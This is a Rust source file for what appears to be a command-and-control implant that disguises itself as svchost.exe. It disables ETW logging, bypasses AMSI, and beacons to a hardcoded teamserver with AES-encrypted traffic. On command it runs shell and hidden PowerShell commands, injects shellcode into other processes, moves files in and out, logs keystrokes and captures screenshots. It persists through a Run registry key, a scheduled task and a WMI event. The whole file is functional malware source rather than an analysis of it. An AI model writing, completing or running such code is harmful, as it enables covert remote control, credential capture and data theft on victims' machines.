use std::{env, fs, ptr,};
use tokio::{net::TcpStream, time::sleep};
use log::{info, error};
use simple_logger::SimpleLogger;
use rand::{Rng, rngs::OsRng};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use aes::Aes256;
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::Pkcs7;
use serde::{Deserialize, Serialize};
use std::error::Error;
use base64::{Engine as _, engine::general_purpose};
use winapi::um::winnt::{PROCESS_ALL_ACCESS, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
use winapi::um::libloaderapi::GetModuleHandleA;
use winapi::um::memoryapi::VirtualProtect;
use std::time::Duration;
use std::process::Command;
use std::fs::OpenOptions;
use std::io::Write;
use std::path::Path;
use log::LevelFilter;

// Masquerade process as svchost.exe
const PROCESS_NAME: &str = "svchost.exe";
const SERVICE_NAME: &str = "Windows System Service Host";

type Aes256Cbc = Cbc<Aes256, Pkcs7>;

const TEAMSERVER: &str = "192.168.1.186:50050";
const SLEEP_TIME: u64 = 60;
const JITTER: u64 = 10;
const AES_KEY: [u8; 32] = [
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
    0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
    0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F
];
const AES_IV: [u8; 16] = [
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F
];

#[derive(Serialize, Deserialize, Debug)]
struct TaskData {
    task_id: u32,
    command: String,
    args: Vec<String>,
    data: Option<String>
}

#[derive(Serialize, Deserialize, Debug)]
struct DemonMetadata {
    hostname: String,
    username: String,
    domain: String,
    os_info: String,
    privileges: String,
    process_name: String,
    process_id: u32,
}

#[derive(Serialize, Deserialize, Debug)]
struct BeaconResponse {
    metadata: DemonMetadata,
    task_output: Option<String>,
    error: Option<String>
}

// API hashing function
fn hash_api(name: &str) -> u32 {
    name.bytes().fold(0, |hash, c| hash.rotate_left(13).wrapping_add(c as u32))
}

// Get function address by hash
unsafe fn get_proc_by_hash(module: *mut u8, hash: u32) -> *mut u8 {
    let dos = module as *mut winapi::um::winnt::IMAGE_DOS_HEADER;
    let nt = (module as usize + (*dos).e_lfanew as usize) as *mut winapi::um::winnt::IMAGE_NT_HEADERS;
    let export_dir = (module as usize + (*nt).OptionalHeader.DataDirectory[0].VirtualAddress as usize) 
        as *mut winapi::um::winnt::IMAGE_EXPORT_DIRECTORY;
    
    let names = std::slice::from_raw_parts(
        (module as usize + (*export_dir).AddressOfNames as usize) as *const u32,
        (*export_dir).NumberOfNames as usize
    );
    
    let functions = std::slice::from_raw_parts(
        (module as usize + (*export_dir).AddressOfFunctions as usize) as *const u32,
        (*export_dir).NumberOfFunctions as usize
    );
    
    let ordinals = std::slice::from_raw_parts(
        (module as usize + (*export_dir).AddressOfNameOrdinals as usize) as *const u16,
        (*export_dir).NumberOfNames as usize
    );
    
    for i in 0..(*export_dir).NumberOfNames {
        let name = std::ffi::CStr::from_ptr((module as usize + names[i as usize] as usize) as *const i8);
        if let Ok(name_str) = name.to_str() {
            if hash_api(name_str) == hash {
                return (module as usize + functions[ordinals[i as usize] as usize] as usize) as *mut u8;
            }
        }
    }
    std::ptr::null_mut()
}  
#[tokio::main(flavor = "current_thread")]
async fn main() {
    SimpleLogger::new().with_level(LevelFilter::Info).init().unwrap();
    info!("{} initializing...", SERVICE_NAME);

    // Hide original executable and masquerade as svchost.exe
    if let Ok(exe_path) = env::current_exe() {
        let parent = exe_path.parent().unwrap_or_else(|| Path::new("."));
        let new_path = parent.join(PROCESS_NAME);

        // Rename and launch the process if not already running as svchost.exe
        if exe_path.file_name().unwrap_or_default() != PROCESS_NAME {
            if let Err(e) = fs::rename(&exe_path, &new_path) {
                error!("Failed to rename executable: {}", e);
                return;
            }
            if let Err(e) = Command::new(&new_path).spawn() {
                error!("Failed to start renamed process: {}", e);
                return;
            }
            return; // Terminate initial process
        }
    }

    if let Err(e) = setup_demon().await {
        error!("Failed to initialize service: {}", e);
        return;
    }

    let mut last_checkin = std::time::Instant::now();
    let mut consecutive_failures = 0u32;
    
    loop {
        match beacon().await {
            Ok(_) => {
                consecutive_failures = 0;
                last_checkin = std::time::Instant::now();
                let sleep_jitter = calculate_sleep_jitter(SLEEP_TIME, JITTER);
                sleep(Duration::from_secs(sleep_jitter)).await;
            },
            Err(e) => {
                consecutive_failures += 1;
                error!("Service check failed (attempt {}): {}", consecutive_failures, e);
                let failure_duration = last_checkin.elapsed().as_secs();
                let backoff = std::cmp::min(
                    SLEEP_TIME * 2u64.pow((failure_duration / 3600).min(10) as u32), 
                    86400
                );
                sleep(Duration::from_secs(backoff)).await;
            }
        }
    }
}

async fn setup_demon() -> Result<(), Box<dyn Error>> {
    // Patch ETW
    unsafe {
        let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr() as *const i8);
        if ntdll.is_null() {
            return Err("Failed to get ntdll handle".into());
        }
        
        let etw_eventwrite = get_proc_by_hash(ntdll as *mut u8, hash_api("EtwEventWrite"));
        if etw_eventwrite.is_null() {
            return Err("Failed to find EtwEventWrite".into());
        }

        let mut old_protect = 0;
        if VirtualProtect(
            etw_eventwrite as *mut _,
            1,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect
        ) == 0 {
            return Err("Failed to modify memory protection".into());
        }
        
        *(etw_eventwrite as *mut u8) = 0xC3; // ret

        // Restore original protection
        VirtualProtect(
            etw_eventwrite as *mut _,
            1,
            old_protect,
            &mut old_protect
        );
    }

    establish_persistence().await?;
    Ok(())
}
async fn beacon() -> Result<(), Box<dyn Error>> {
    let mut stream = TcpStream::connect(TEAMSERVER).await?;
    
    let metadata = collect_metadata().await?;
    let beacon_data = BeaconResponse {
        metadata,
        task_output: None,
        error: None
    };
    
    let encrypted_data = encrypt_data(&serde_json::to_vec(&beacon_data)?)?;
    stream.write_u32_le(encrypted_data.len() as u32).await?;
    stream.write_all(&encrypted_data).await?;
    
    let response_len = stream.read_u32_le().await? as usize;
    if response_len > 0 {
        let mut response = vec![0u8; response_len];
        stream.read_exact(&mut response).await?;
        
        let decrypted = decrypt_data(&response)?;
        let tasks: Vec<TaskData> = serde_json::from_slice(&decrypted)?;
        
        for task in tasks {
            let task_result = execute_task(task).await;
            
            let result = BeaconResponse {
                metadata: collect_metadata().await?,
                task_output: task_result.as_ref().ok().map(|s| s.to_string()),
                error: task_result.as_ref().err().map(|e| e.to_string())
            };
            
            let encrypted_result = encrypt_data(&serde_json::to_vec(&result)?)?;
            stream.write_u32_le(encrypted_result.len() as u32).await?;
            stream.write_all(&encrypted_result).await?;
        }
    }

    Ok(())
}

async fn execute_task(task: TaskData) -> Result<String, Box<dyn Error>> {
    info!("Processing service request {}: {}", task.task_id, task.command);
    
    match task.command.as_str() {
        "shell" => execute_shell(&task.args.join(" ")).await,
        "powershell" => execute_powershell(&task.args.join(" ")).await,
        "inject" => {
            let pid = task.args[0].parse::<u32>()?;
            let shellcode = general_purpose::STANDARD.decode(&task.data.unwrap())?;
            inject_shellcode(pid, &shellcode)?;
            Ok("Service module loaded successfully".to_string())
        },
        "download" => {
            let file_content = fs::read(&task.args[0])?;
            Ok(general_purpose::STANDARD.encode(file_content))
        },
        "upload" => {
            let file_path = &task.args[0];
            let file_data = general_purpose::STANDARD.decode(task.data.unwrap())?;
            fs::write(file_path, file_data)?;
            Ok(format!("Service data written to {}", file_path))
        },
        "sleep" => {
            let new_sleep = task.args[0].parse::<u64>()?;
            Ok(format!("Service interval updated to {} seconds", new_sleep))
        },
        "exit" => {
            info!("Service shutdown requested");
            std::process::exit(0);
        },
        "keylogger" => {
            start_keylogger().await?;
            Ok("Input monitoring started".to_string())
        },
        "screenshot" => {
            let screenshot_path = take_screenshot()?;
            Ok(format!("Display capture saved to {}", screenshot_path))
        },
        "list_files" => {
            let dir_path = &task.args[0];
            let files = list_files(dir_path)?;
            Ok(files)
        },
        _ => Err("Invalid service request".into())
    }
}

async fn execute_shell(cmd: &str) -> Result<String, Box<dyn Error>> {
    let output = Command::new("cmd")
        .args(&["/C", cmd])
        .output()?;
    
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

async fn execute_powershell(script: &str) -> Result<String, Box<dyn Error>> {
    // AMSI bypass
    let amsi_bypass = r#"
        $a=[Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};
        $d=$c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};
        $g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);
        [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
    "#;
    
    Command::new("powershell")
        .args(&["-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", amsi_bypass])
        .output()?;

    let output = Command::new("powershell")
        .args(&["-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", script])
        .output()?;

    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

fn inject_shellcode(pid: u32, shellcode: &[u8]) -> Result<(), Box<dyn Error>> {
    unsafe {
        let kernel32 = GetModuleHandleA(b"kernel32.dll\0".as_ptr() as *const i8);
        if kernel32.is_null() {
            return Err("Failed to get kernel32 handle".into());
        }

        let open_process = get_proc_by_hash(kernel32 as *mut u8, hash_api("OpenProcess"));
        let virtual_alloc_ex = get_proc_by_hash(kernel32 as *mut u8, hash_api("VirtualAllocEx"));
        let write_process_memory = get_proc_by_hash(kernel32 as *mut u8, hash_api("WriteProcessMemory"));
        let create_remote_thread = get_proc_by_hash(kernel32 as *mut u8, hash_api("CreateRemoteThread"));

        if open_process.is_null() || virtual_alloc_ex.is_null() || 
           write_process_memory.is_null() || create_remote_thread.is_null() {
            return Err("Failed to resolve required functions".into());
        }

        let process_handle = std::mem::transmute::<_, extern "system" fn(u32, i32, u32) -> *mut std::ffi::c_void>(open_process)
            (PROCESS_ALL_ACCESS, 0, pid);
        
        if process_handle.is_null() {
            return Err("Failed to open target process".into());
        }

        let remote_buffer = std::mem::transmute::<_, extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void, usize, u32, u32) -> *mut std::ffi::c_void>(virtual_alloc_ex)
            (process_handle, ptr::null_mut(), shellcode.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if remote_buffer.is_null() {
            return Err("Failed to allocate memory in target process".into());
        }

        let mut bytes_written = 0;
        let write_result = std::mem::transmute::<_, extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void, *const std::ffi::c_void, usize, *mut usize) -> i32>(write_process_memory)
            (process_handle, remote_buffer, shellcode.as_ptr() as *const _, shellcode.len(), &mut bytes_written);

        if write_result == 0 {
            return Err("Failed to write service data to target process".into());
        }

        let thread_handle = std::mem::transmute::<_, extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void, usize, extern "system" fn(*mut std::ffi::c_void) -> u32, *mut std::ffi::c_void, u32, *mut u32) -> *mut std::ffi::c_void>(create_remote_thread)
            (process_handle, ptr::null_mut(), 0, std::mem::transmute(remote_buffer), ptr::null_mut(), 0, ptr::null_mut());

        if thread_handle.is_null() {
            return Err("Failed to start service thread".into());
        }
    }
    Ok(())
}

async fn establish_persistence() -> Result<(), Box<dyn Error>> {
    let exe_path = env::current_exe()?;
    
    let reg_result = Command::new("reg")
        .args(&["add", "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
               "/v", SERVICE_NAME, 
               "/t", "REG_SZ",
               "/d", &exe_path.to_string_lossy(),
               "/f"])
        .output()
        .map_err(|e| Box::new(e) as Box<dyn Error>)?;

    if !reg_result.status.success() {
        let error_msg = String::from_utf8_lossy(&reg_result.stderr);
        error!("Service registration failed: {}", error_msg);
    }

    let task_result = Command::new("schtasks")
        .args(&["/create", "/tn", SERVICE_NAME,
               "/tr", &exe_path.to_string_lossy(),
               "/sc", "onlogon",
               "/rl", "highest",
               "/f"])
        .output()
        .map_err(|e| Box::new(e) as Box<dyn Error>)?;

    if !task_result.status.success() {
        let error_msg = String::from_utf8_lossy(&task_result.stderr);
        error!("Service task scheduling failed: {}", error_msg);
    }

    let wmi_result = Command::new("powershell")
        .args(&["-Command", &format!(
            "New-WMIEvent -Query 'SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_PerfFormattedData_PerfOS_System\"' -Action {{{}}}",
            exe_path.to_string_lossy()
        )])
        .output()
        .map_err(|e| Box::new(e) as Box<dyn Error>)?;

    if !wmi_result.status.success() {
        let error_msg = String::from_utf8_lossy(&wmi_result.stderr);
        error!("Service event registration failed: {}", error_msg);
    }

    if reg_result.status.success() || task_result.status.success() || wmi_result.status.success() {
        Ok(())
    } else {
        Err("Service registration failed".into())
    }
}

async fn collect_metadata() -> Result<DemonMetadata, Box<dyn Error>> {
    Ok(DemonMetadata {
        hostname: String::from_utf8_lossy(&Command::new("hostname").output()?.stdout).trim().to_string(),
        username: env::var("USERNAME")?,
        domain: env::var("USERDOMAIN")?,
        os_info: String::from_utf8_lossy(&Command::new("ver").output()?.stdout).trim().to_string(),
        privileges: if is_elevated()? { "Administrator".to_string() } else { "User".to_string() },
        process_name: PROCESS_NAME.to_string(),
        process_id: std::process::id(),
    })
}

fn is_elevated() -> Result<bool, Box<dyn Error>> {
    let output = Command::new("whoami")
        .args(&["/groups"])
        .output()?;
    Ok(String::from_utf8_lossy(&output.stdout).contains("S-1-16-12288"))
}

fn calculate_sleep_jitter(sleep: u64, jitter: u64) -> u64 {
    let mut rng = OsRng;
    let jitter_amount = (sleep as f64 * (jitter as f64 / 100.0)) as u64;
    sleep + rng.gen_range(0..=jitter_amount)
}

fn encrypt_data(data: &[u8]) -> Result<Vec<u8>, Box<dyn Error>> {
    let cipher = Aes256Cbc::new_from_slices(&AES_KEY, &AES_IV)?;
    Ok(cipher.encrypt_vec(data))
}

fn decrypt_data(data: &[u8]) -> Result<Vec<u8>, Box<dyn Error>> {
    let cipher = Aes256Cbc::new_from_slices(&AES_KEY, &AES_IV)?;
    cipher.decrypt_vec(data).map_err(|e| e.into())
}

async fn start_keylogger() -> Result<(), Box<dyn Error>> {
    use winapi::um::winuser::{GetAsyncKeyState, VK_SHIFT};

    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open("keylog.txt")?;

    loop {
        for key in 0x08..0xFF {
            if unsafe { GetAsyncKeyState(key) } & 0x0001 != 0 {
                let mut key_char = match key {
                    0x30..=0x39 => (key as u8) as char, // Numbers 0-9
                    0x41..=0x5A => (key as u8) as char, // Letters A-Z
                    _ => continue,
                };

                if unsafe { GetAsyncKeyState(VK_SHIFT) } & (0x8000u16 as i16) == 0 {
                    key_char = key_char.to_ascii_lowercase();
                }

                writeln!(file, "{}", key_char)?;
            }
        }
        sleep(Duration::from_millis(10)).await;
    }
}

fn take_screenshot() -> Result<String, Box<dyn Error>> {
    use std::path::Path;
    use std::process::Command;

    // Define the output file path
    let output_path = "screenshot.png";

    // command to take a screenshot
    {
        Command::new("powershell")
            .arg("-command")
            .arg(format!(
                "Add-Type -AssemblyName System.Windows.Forms; \
                 Add-Type -AssemblyName System.Drawing; \
                 $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; \
                 $bitmap = New-Object System.Drawing.Bitmap $bounds.width, $bounds.height; \
                 $graphics = [System.Drawing.Graphics]::FromImage($bitmap); \
                 $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.size); \
                 $bitmap.Save('{}', [System.Drawing.Imaging.ImageFormat]::Png);",
                output_path
            ))
            .output()?;
    }
    // Verify the screenshot file was created
    if Path::new(output_path).exists() {
        Ok(output_path.to_string())
    } else {
        Err("Failed to capture display".into())
    }
}

fn list_files(dir_path: &str) -> Result<String, Box<dyn Error>> {
    let paths = fs::read_dir(dir_path)?;
    let mut file_list = String::new();
    for path in paths {
        let file_name = path?.file_name();
        file_list.push_str(&format!("{}\n", file_name.to_string_lossy()));
    }
    Ok(file_list)
} 

fn encrypt_command_output(output: &str) -> Result<String, Box<dyn Error>> {
    let encrypted = encrypt_data(output.as_bytes())?;
    Ok(general_purpose::STANDARD.encode(encrypted))
}
